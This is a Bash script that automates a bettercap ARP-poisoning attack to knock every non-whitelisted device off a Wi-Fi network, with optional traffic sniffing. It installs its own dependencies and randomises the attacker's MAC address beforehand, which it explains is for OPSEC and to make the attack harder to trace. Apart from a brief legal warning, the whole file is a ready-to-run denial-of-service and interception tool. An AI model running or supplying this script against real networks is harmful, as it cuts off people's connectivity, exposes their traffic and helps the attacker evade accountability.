#!/bin/bash

clear
echo "---------------------------------------------------------"
echo "   deny_all_wifi v1.2.0 (Bash): BETTERCAP ARP.BAN AUTOMATION"
echo "---------------------------------------------------------"
echo ""

if [ "$EUID" -ne 0 ]; then
	echo "[-] This script requires root privileges to execute."
	while true; do
		read -p "[?] Would you like to attempt to elevate privileges? (yes/no): " elevate_choice
		if [[ "$elevate_choice" == "yes" || "$elevate_choice" == "y" ]]; then
			break
		elif [[ "$elevate_choice" == "no" || "$elevate_choice" == "n" ]]; then
			echo "[-] Exiting: bettercap cannot run without root privileges."
			exit 1
		else
			echo "[-] Invalid input. Please enter 'yes' or 'no'."
		fi
	done
	
	priv_tool=""
	for tool in sudo doas pkexec; do
		if command -v "$tool" >/dev/null 2>&1; then
			priv_tool="$tool"
			break
		fi
	done
	
	if [ -z "$priv_tool" ]; then
		while true; do
			echo "[-] Could not automatically detect 'sudo', 'doas', or 'pkexec'."
			read -p "[?] Enter your custom privilege escalation tool (or type 'exit' to quit): " priv_tool
			if [[ "$priv_tool" == "exit" ]]; then
				echo "[-] Exiting."
				exit 1
			fi
			if ! command -v "$priv_tool" >/dev/null 2>&1; then
				echo "[-] ERROR: The tool '$priv_tool' could not be found. Try again."
			else
				break
			fi
		done
	fi

	if [ -n "$priv_tool" ]; then
		echo "[+] Attempting to escalate using '$priv_tool'..."
		exec $priv_tool "$0" "$@"
		echo "[-] Escalation using '$priv_tool' failed."
	fi
	exit 1
fi

echo "[+] Root privileges confirmed."

echo -e "\n----------------------- LEGAL WARNING -----------------------"
echo -e "[!] ONLY run this script on networks you own or where you have"
echo -e "    explicit permission from the owner to perform testing. [!]\n"
echo "This script requires root privileges. It will block ALL"
echo "devices on the network unless whitelisted via ARP poisoning."
echo "-------------------------------------------------------------"

while true; do
	read -p "[?] Do you wish to proceed with the execution? (yes/no): " confirm
	if [[ "$confirm" == "yes" || "$confirm" == "y" ]]; then
		break
	elif [[ "$confirm" == "no" || "$confirm" == "n" ]]; then
		echo "Execution cancelled by user. Exiting."
		exit 0
	else
		echo "[-] Invalid input. Please enter 'yes' or 'no'."
	fi
done

program_check() {
	local req_cmds=("bettercap" "macchanger" "ip")
	local missing_pkgs=()

	echo "[+] Running dependency check..."

	for cmd in "${req_cmds[@]}"; do
		if command -v "$cmd" >/dev/null 2>&1; then
			echo "[+] '$cmd' is already installed."
		else
			echo "[-] '$cmd' is NOT installed."
			missing_pkgs+=("$cmd")
		fi
	done

	if [ ${#missing_pkgs[@]} -eq 0 ]; then
		echo "[+] All dependencies are met. Moving on..."
		return 0
	fi

	echo -e "\n[!] The following dependencies are missing: ${missing_pkgs[*]}"
	while true; do
		read -p "[?] Would you like to attempt to auto-install them now? (yes/no): " choice
		case "$choice" in
			[Yy]*|[Yy][Ee][Ss])
				echo "[+] Proceeding with installation..."
				break
				;;
			[Nn]*|[Nn][Oo])
				echo "[-] Dependency check failed. Please install ${missing_pkgs[*]} manually. Exiting."
				exit 1
				;;
			*)
				echo "[-] Invalid input. Please enter 'yes' or 'no'."
				;;
		esac
	done

	local manager=""
	if command -v apt >/dev/null 2>&1; then
		manager="apt-get update && apt-get install -y"
	elif command -v pacman >/dev/null 2>&1; then
		manager="pacman -Sy --noconfirm"
	elif command -v dnf >/dev/null 2>&1; then
		manager="dnf install -y"
	elif command -v zypper >/dev/null 2>&1; then
		manager="zypper install -y"
	fi

	if [ -z "$manager" ]; then
		echo "[-] ERROR: No recognized package manager (apt, pacman, dnf, zypper) found."
		echo "[-] Please install the missing packages manually."
		echo "[-] The missing dependencies are: bettercap, macchanger, ip, iproute2)"
		exit 1
	fi

	for pkg in "${missing_pkgs[@]}"; do
		echo "[i] Installing '$pkg'..."
		local install_name="$pkg"
		if [[ "$pkg" == "ip" ]]; then install_name="iproute2"; fi

		eval "$manager $install_name"

		if command -v "$pkg" >/dev/null 2>&1; then
			echo "[+] Successfully installed '$pkg'."
		else
			echo "[-] ERROR: Failed to install '$pkg'."
			exit 1
		fi
	done

	echo "[+] All dependencies installed successfully."
}

program_check

echo -e "\n[+] Scanning for Wi-Fi Interfaces...\n"
printf "%-4s | %-15s | %-15s | %-45s | %-15s\n" "Num" "Interface" "IPv4" "IPv6" "Gateway"
printf "%-4s | %-15s | %-15s | %-45s | %-15s\n" "----" "---------------" "---------------" "---------------------------------------------" "---------------"

declare -a interfaces
idx=1
for iface_path in /sys/class/net/*/wireless; do
	[ ! -d "$iface_path" ] && continue
	iface=$(basename $(dirname "$iface_path"))
	interfaces+=("$iface")
	
	ipv4=$(ip -4 addr show dev "$iface" 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1 | head -n1)
	ipv6=$(ip -6 addr show dev "$iface" 2>/dev/null | awk '/inet6 / {print $2}' | cut -d/ -f1 | head -n1)
	gw=$(ip route show default dev "$iface" 2>/dev/null | awk '/default/ {print $3}' | head -n1)
	
	[ -z "$ipv4" ] && ipv4="N/A"
	[ -z "$ipv6" ] && ipv6="N/A"
	[ -z "$gw" ] && gw="N/A"
	
	printf "%-4d | %-15s | %-15s | %-45s | %-15s\n" "$idx" "$iface" "$ipv4" "$ipv6" "$gw"
	((idx++))
done

if [ ${#interfaces[@]} -eq 0 ]; then
	echo "[-] ERROR: No Wi-Fi interfaces detected on this system."
	exit 1
fi

echo ""
while true; do
	read -p "[?] Select an interface by number (1-${#interfaces[@]}): " iface_num
	if [[ "$iface_num" =~ ^[0-9]+$ ]] && [ "$iface_num" -ge 1 ] && [ "$iface_num" -le "${#interfaces[@]}" ]; then
		INTERFACE="${interfaces[$((iface_num-1))]}"
		break
	else
		echo "[-] ERROR: Invalid selection. Please enter a number between 1 and ${#interfaces[@]}."
	fi
done

CONFIG_DIR="$HOME/bettercap_conf"
mkdir -p "$CONFIG_DIR"
CONFIG_FILE="$CONFIG_DIR/deny_all_wifi.conf"

FULL_DUPLEX=""
SNIFF_TRAFFIC=""
SPOOF_INTERNAL=""
WHITELIST=""

generate_config() {
	cat <<EOF > "$CONFIG_FILE"
fullduplex=$FULL_DUPLEX
sniff_traffic=$SNIFF_TRAFFIC
spoof_internal=$SPOOF_INTERNAL
whitelist=$WHITELIST
EOF
	echo "[+] Configuration saved to $CONFIG_FILE"
}

setup_config() {
	echo -e "\n[i] No configuration file found. Creating new config at: $CONFIG_FILE"
	echo "[i] 'Interactive' mode will allow you to configure the file right here from the command prompt."
	while true; do
		read -p "[?] Use 'default' or 'interactive' config? (d/i): " config_mode
		if [[ "$config_mode" == "default" || "$config_mode" == "d" ]]; then
			FULL_DUPLEX="yes"; SNIFF_TRAFFIC="yes"; SPOOF_INTERNAL="yes"; WHITELIST="no"
			
			echo -e "\n-------------------------------------"
			echo "[i] PREVIEW: DEFAULT SETTINGS"
			echo "-------------------------------------"
			printf "    %-16s : %s\n" "Full Duplex" "$FULL_DUPLEX"
			printf "    %-16s : %s\n" "Sniff Traffic" "$SNIFF_TRAFFIC"
			printf "    %-16s : %s\n" "Spoof Internal" "$SPOOF_INTERNAL"
			printf "    %-16s : %s\n" "Whitelist" "$WHITELIST"
			echo "-------------------------------------"
			
			read -p "[?] Proceed with these defaults or switch to 'interactive'? (proceed/interactive): " def_choice
			case "$(echo "$def_choice" | tr '[:upper:]' '[:lower:]')" in
				interactive|i)
					continue
					;;
				proceed|p|yes|y|"")
					echo "[+] Default variables applied."
					generate_config
					break
					;;
			esac
		elif [[ "$config_mode" == "interactive" || "$config_mode" == "i" ]]; then
			echo -e "\n[+] --- Interactive Configuration ---"
			
			ask_yes_no() {
				local prompt="$1"
				while true; do
					read -p "[?] $prompt (y/n): " ans
					case "${ans,,}" in
						y|yes) echo "yes"; return ;;
						n|no) echo "no"; return ;;
					esac
				done
			}

			FULL_DUPLEX=$(ask_yes_no "Enable Full Duplex mode?")
			SNIFF_TRAFFIC=$(ask_yes_no "Enable Traffic Sniffing?")
			SPOOF_INTERNAL=$(ask_yes_no "Enable Internal Spoofing?")

			read -p "[?] Enter Whitelist (IPV4s/IPV6s/MACs separated by commas and then a space, e.g., 192.168.1.5, 00:11:22:33:44:55), or press Enter to disable: " input_wl
			if [ -z "$input_wl" ]; then
				WHITELIST="no"
			else
				WHITELIST=$(echo "$input_wl" | tr -d ' ')
			fi
			echo "-------------------------------------"
			generate_config
			break
		else
			echo "[-] Invalid input. Please enter 'default' or 'interactive'."
		fi
	done
}

if [ -f "$CONFIG_FILE" ]; then
	echo "[+] Configuration file found ($CONFIG_FILE). Loading variables..."
	while IFS='=' read -r key value; do
		[[ -z "$key" ]] && continue
		key=$(echo "$key" | tr -d '[:space:]')
		value=$(echo "$value" | sed -e 's/^"//' -e 's/"$//' | tr -d '\r')
		
		case "$key" in
			fullduplex) [[ -n "$value" ]] && FULL_DUPLEX="$value" ;;
			sniff_traffic) [[ -n "$value" ]] && SNIFF_TRAFFIC="$value" ;;
			spoof_internal) [[ -n "$value" ]] && SPOOF_INTERNAL="$value" ;;
			whitelist) [[ -n "$value" ]] && WHITELIST="$value" ;;
		esac
	done < "$CONFIG_FILE"

	is_invalid() {
		if [[ -z "$1" ]]; then return 0; fi
		case "$(echo "$1" | tr '[:upper:]' '[:lower:]')" in
			yes|y|no|n) return 1 ;;
			*) return 0 ;;
		esac
	}

	if is_invalid "$FULL_DUPLEX" || is_invalid "$SNIFF_TRAFFIC" || is_invalid "$SPOOF_INTERNAL"; then
		echo "[-] Configuration corrupted or invalid."
		setup_config
	fi
else
	echo "[-] No configuration file found."
	setup_config
fi

while true; do
	echo -e "\n-----------------------------------------------------"
	echo "[i] CURRENT CONFIGURATION PROFILE"
	echo "-----------------------------------------------------"
	printf "    %-16s : %s\n" "Config Path" "$CONFIG_FILE"
	printf "    %-16s : %s\n" "Full Duplex" "$FULL_DUPLEX"
	printf "    %-16s : %s\n" "Sniff Traffic" "$SNIFF_TRAFFIC"
	printf "    %-16s : %s\n" "Spoof Internal" "$SPOOF_INTERNAL"
	printf "    %-16s : %s\n" "Whitelist" "$WHITELIST"
	echo "-----------------------------------------------------"
	read -p "[?] Are these settings correct? (yes/no): " settings_confirm

	if [[ "$settings_confirm" == "yes" || "$settings_confirm" == "y" ]]; then
		break
	else
		setup_config
		echo -e "\n[+] Configuration updated."
		read -p "[?] Continue, Restart, or Exit? (c/r/e): " choice
		case "${choice,,}" in
			r)
				echo "[+] Restarting script to apply all changes..."
				exec "$0" "$@"
				;;
			e)
				echo "[+] Exiting."
				exit 0
				;;
		esac
	fi
done

if ! command -v bettercap &> /dev/null; then
	echo "[-] ERROR: bettercap could not be found. Please install it first."
	echo "[+] Automatically checking for and prompting you to install all dependencies including bettercap"
	program_check
	
	echo -e "\n[+] Dependencies are now installed."
	read -p "[?] Would you like to 'restart' the script now or 'exit'? (restart/exit): " dep_choice
	if [[ "$dep_choice" == "restart" || "$dep_choice" == "r" ]]; then
		clear
		exec "$0" "$@"
	else
		echo "[+] Exiting. Please relaunch the script when ready."
		exit 0
	fi
fi

echo "[+] Constructing Bettercap attack sequence..."

BETTERCAP_EVAL="net.probe on; "

if [[ "$SPOOF_INTERNAL" == "yes" || "$SPOOF_INTERNAL" == "y" ]]; then
	BETTERCAP_EVAL+="set arp.spoof.internal true; "
else
	BETTERCAP_EVAL+="set arp.spoof.internal false; "
fi

if [[ "$FULL_DUPLEX" == "yes" || "$FULL_DUPLEX" == "y" ]]; then
	BETTERCAP_EVAL+="set arp.spoof.fullduplex true; "
else
	BETTERCAP_EVAL+="set arp.spoof.fullduplex false; "
fi

if [[ "$SNIFF_TRAFFIC" == "yes" || "$SNIFF_TRAFFIC" == "y" ]]; then
	BETTERCAP_EVAL+="net.sniff on; "
fi

if [[ "$WHITELIST" != "no" && "$WHITELIST" != "n" && -n "$WHITELIST" ]]; then
	if [[ ! "$WHITELIST" =~ [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+ ]] && [[ ! "$WHITELIST" =~ ([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}) ]]; then
		echo "[-] WARNING: The whitelist doesn't strictly match a standard IPv4 or MAC format. Sending to bettercap anyway."
	fi
	echo "[!] Applying whitelist: Bettercap will skip attacking -> $WHITELIST"
	BETTERCAP_EVAL+="set arp.spoof.whitelist $WHITELIST; "
fi

BETTERCAP_EVAL+="arp.ban on;"

echo
echo "[+] Setting MAC Address to Random Realistic MAC Address."
echo
echo -e "\n[+] Explanation can be found below."
echo "This masks your machine's MAC Address on the network before beginning the attack by taking the interface down and offline first with the ip link program."
echo "This is done as it increases OPSEC and the ability to trace an attack back to your machine. It also generally improves security as well."
echo "Then setting the interfaces MAC Address to a random and what appears to be a burned in MAC Address using the macchanger program with the -r and -b arguments."
echo "Then bringing it back up online with the ip link program."
echo -e "[+] Explanation Complete\n"

ip link set dev "$INTERFACE" down
macchanger -r -b "$INTERFACE"
ip link set dev "$INTERFACE" up

echo "[+] Your old, new, and real permanent MAC address for your Wi-Fi Adaptor are all Displayed Above by macchanger when your MAC Address was changed."
echo -e "[+] MAC Address has been set to a Realistically Random MAC Address.\n"

echo "-----------------------------------------------------"
echo "[+] FINAL PREPARATIONS COMPLETE"
echo "    Interface: $INTERFACE"
echo "    Sequence : $BETTERCAP_EVAL"
echo "-----------------------------------------------------"

while true; do
	read -p "[?] Are you ready to launch Bettercap as root and execute this sequence? (yes/no): " final_confirm
	if [[ "$final_confirm" == "yes" || "$final_confirm" == "y" ]]; then
		echo "[+] Executing sequence now..."
		echo "[!] Press Ctrl+C to stop the attack and restore the network."
		echo "-----------------------------------------------------"
		bettercap -iface "$INTERFACE" -eval "$BETTERCAP_EVAL" || {
			echo "[-] CRITICAL ERROR: Bettercap encountered an issue and crashed."
			exit 1
		}
		break
	elif [[ "$final_confirm" == "no" || "$final_confirm" == "n" ]]; then
		echo "[-] Execution aborted by user. Exiting."
		exit 0
	else
		echo "[-] Invalid input. Please enter 'yes' or 'no'."
	fi
done

echo "[+] Attack stopped. Network should be returning to normal."
exit 0